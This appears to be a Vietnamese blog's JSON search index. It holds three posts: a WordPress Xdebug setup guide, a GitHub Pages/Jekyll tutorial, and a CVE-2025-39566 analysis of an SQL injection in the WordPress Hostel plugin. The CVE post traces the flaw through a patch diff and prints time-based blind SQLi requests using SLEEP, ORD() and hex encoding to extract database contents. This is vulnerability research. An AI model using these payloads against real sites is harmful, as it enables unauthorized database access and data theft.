VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); ","permalink":"//localhost:1313/vi/posts/2025-08-21-wordpress-local-and-debugging/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction Khi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\nGithub Pages: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\nJekyll: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\nGiscus: M·ªôt h·ªá th·ªëng b√¨nh lu·∫≠n hi·ªán ƒë·∫°i d·ª±a tr√™n GitHub Discussions. Thay v√¨ ph·∫£i d√πng d·ªãch v·ª• ngo√†i nh∆∞ Disqus, b·∫°n c√≥ th·ªÉ t·∫≠n d·ª•ng GitHub ƒë·ªÉ qu·∫£n l√Ω comment, v·ª´a g·ªçn nh·∫π v·ª´a th√¢n thi·ªán v·ªõi developer.\nRequirements T√†i kho·∫£n Github Ki·∫øn th·ª©c c∆° b·∫£n v·ªÅ Markdown Creating a Site Repository ·ªû ƒë√¢y, t√¥i s·ª≠ d·ª•ng Chirpy themes, ƒë√¢y l√† theme kh√° n·ªïi ti·∫øng d√†nh cho GitHub Pages, ƒë∆∞·ª£c t·ªëi ∆∞u cho vi·ªác vi·∫øt blog c√° nh√¢n ho·∫∑c technical blog.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nƒêƒÉng nh·∫≠p v√†o Github v√† di chuy·ªÉn ƒë·∫øn starter Thay v√¨ Fork, ta click Use this template v√† ch·ªçn Create a new repository ƒë·ªÉ t·ª± ƒë·ªông t·∫°o Site Repository. ƒê·∫∑t t√™n cho Repository m·ªõi \u0026lt;username\u0026gt;.github.io, thay ƒë·ªïi \u0026lt;username\u0026gt; th√†nh Github username c·ªßa b·∫°n. Setting up the Environment C√≥ 2 l√Ω do ch√≠nh b·∫°n n√™n setup m√¥i tr∆∞·ªùng tr√™n m√°y local khi ph√°t tri·ªÉn blog:\nSau khi push code l√™n Repository, GitHub Actions s·∫Ω m·∫•t m·ªôt kho·∫£ng th·ªùi gian ƒë·ªÉ ch·∫°y r·ªìi m·ªõi build v√† render ra GitHub Pages. Khi dev tr·ª±c ti·∫øp tr√™n local, b·∫°n c√≥ th·ªÉ quan s√°t k·∫øt qu·∫£ ngay l·∫≠p t·ª©c, nhanh h∆°n v√† thu·∫≠n ti·ªán h∆°n. Using Dev Containers (Recommended for Windows) Dev Containers cung c·∫•p m·ªôt m√¥i tr∆∞·ªùng c√¥ l·∫≠p b·∫±ng Docker, gi√∫p tr√°nh xung ƒë·ªôt v·ªõi h·ªá th·ªëng v√† ƒë·∫£m b·∫£o m·ªçi dependency ƒë·ªÅu ƒë∆∞·ª£c qu·∫£n l√Ω trong container.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t Docker: Tr√™n Windows/macOS: c√†i Docker Desktop. Tr√™n Linux: c√†i Docker Engine. C√†i VS Code v√† extension Dev Containers. Clone repository: N·∫øu d√πng Docker Desktop: m·ªü VS Code v√† clone repo trong container volume. N·∫øu d√πng Docker Engine: clone repo v·ªÅ local, sau ƒë√≥ m·ªü b·∫±ng container trong VS Code. Ch·ªù qu√° tr√¨nh thi·∫øt l·∫≠p Dev Containers ho√†n t·∫•t. Setting up Natively (Recommended for Unix-like OS) V·ªõi c√°c h·ªá ƒëi·ªÅu h√†nh d·∫°ng Unix-like (Linux, macOS), b·∫°n c√≥ th·ªÉ setup m√¥i tr∆∞·ªùng tr·ª±c ti·∫øp (native) ƒë·ªÉ ƒë·∫°t hi·ªáu nƒÉng t·ªët nh·∫•t. Ngo√†i ra, v·∫´n c√≥ th·ªÉ d√πng Dev Containers nh∆∞ m·ªôt l·ª±a ch·ªçn thay th·∫ø.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nL√†m theo h∆∞·ªõng d·∫´n c√†i ƒë·∫∑t Jekyll v√† ƒë·∫£m b·∫£o ƒë√£ c√†i ƒë·∫∑t Git. Clone repository v·ªÅ m√°y local. N·∫øu b·∫°n fork theme, c√†i Node.js v√† ch·∫°y bash tools/init.sh trong th∆∞ m·ª•c g·ªëc ƒë·ªÉ kh·ªüi t·∫°o repo. Ch·∫°y l·ªánh d∆∞·ªõi ƒë√¢y ·ªü th∆∞ m·ª•c g·ªëc ƒë·ªÉ to√†n b·ªô gem s·∫Ω ƒë∆∞·ª£c c√†i v√†o ./vendor/bundle/ trong project, kh√¥ng c·∫ßn sudo v√† kh√¥ng ƒë·ª•ng g√¨ ƒë·∫øn /var/lib/gems.. bundle config set --local path \u0026#39;vendor/bundle\u0026#39; bundle install Usage Start the Jekyll Server ƒê·ªÉ ch·∫°y site tr√™n local, s·ª≠ d·ª•ng l·ªánh d∆∞·ªõi ƒë√¢y:\nbundle exec jekyll s Configuration M·ªôt s·ªë bi·∫øn c·∫ßn c·∫•u h√¨nh trong _config.yml, bao g·ªìm:\nlang: Set language cho website c·ªßa b·∫°n url: Tr·ªè ƒë·∫øn website c·ªßa b·∫°n title: Title ch√≠nh, n·∫±m d∆∞·ªõi avatar tagline: Subtitle, m√¥ t·∫£ trang web avatar: h·ªó tr·ª£ local v√† CORS resources, c√≥ th·ªÉ s·ª≠ d·ª•ng gif Comment feature via Giscus Ta s·ª≠ d·ª•ng Giscus l√†m h·ªá th·ªëng comment cho website, ngo√†i ra c√≤n c√°c option kh√°c nh∆∞: Disqus, Utterances, t·∫•t c·∫£ ƒë·ªÅu mi·ªÖn ph√≠.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t giscus v√†o Github. V√†o Settings c·ªßa repository ch·ªçn General v√† b·∫≠t Discussions ƒë·ªÉ giscus l∆∞u comments v√†o Discussions. Nh·∫≠p repository \u0026lt;username\u0026gt;/\u0026lt;username\u0026gt;.github.io, th√¥ng b√°o m√†u xanh l√° xu·∫•t hi·ªán khi c√°c ti√™u ch√≠ ·ªü tr√™n ƒë∆∞·ª£c ƒë√°p ·ª©ng. Ch·ªçn th·ªÉ lo·∫°i discussion v√† ch·ªß ƒë·ªÅ cho website. C·∫•u h√¨nh giscus trong _config.yml provider: ch·ªçn giscus giscus: mapping c√°c bi·∫øn t∆∞∆°ng ·ª©ng ƒë√£ l√†m ·ªü giscus v√†o bi·∫øn giscus. Customize the Favicon T·∫°o favicon ri√™ng cho website c·ªßa b·∫°n, kh√¥ng ph·∫£i s·ª≠ d·ª•ng favicon m·∫∑c ƒë·ªãnh c·ªßa themes\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nTruy c·∫≠p Favicon Genarate Click Browse ch·ªçn favicon c·∫ßn t·∫°o, sau ƒë√≥ click Create Favicon ƒë·ªÉ t·∫°o. Click Download the generated favicon ƒë·ªÉ t·∫£i c√°c file ch·ª©a c√°c favicon v·ªÅ. Gi·∫£i n√©n file v·ª´a t·∫£i, x√≥a 2 file d∆∞·ªõi ƒë√¢y: browserconfig.xml site.webmanifest Copy to√†n b·ªô file c√≤n l·∫°i v√† paste v√†o assets/img/favicons(n·∫øu ch∆∞a c√≥ th√¨ t·∫°o). Extends Remove meta tag in Footer C√≥ th·ªÉ x√≥a d√≤ng Using the Chirpy theme for Jekyll. b·∫±ng c√°c b∆∞·ªõc sau:\nT·∫°o file theo ƒë∆∞·ªùng d·∫´n sau _data/locales/en.yml. Copy n·ªôi dung en.yml v√† d√°n v√†o file v·ª´a t·∫°o. S·ª≠a n·ªôi dung bi·∫øn meta th√†nh \u0026quot;\u0026quot; Write a post Tham kh·∫£o rule ƒë·ªÉ vi·∫øt blog c·ªßa themes v√† s·ª≠ d·ª•ng Live Preview ƒë·ªÉ quan s√°t\n","permalink":"//localhost:1313/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eKhi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGithub Pages\u003c/strong\u003e: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eJekyll\u003c/strong\u003e: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\u003c/p\u003e","title":"Github Pages with Jekyll themes and Giscus"},{"content":"L·ªó h·ªïng trong plugin Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file controllers/bookings.php\nB·∫£n l·ªó h·ªïng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } B·∫£n v√°:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } üëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nHow it work? ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C√¢u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } ·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ l√†m s·∫°ch HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nConclusion L·ªó h·ªïng CVE-2025-39566 trong plugin WordPress Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nKey takeaways:\nsanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eL·ªó h·ªïng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng 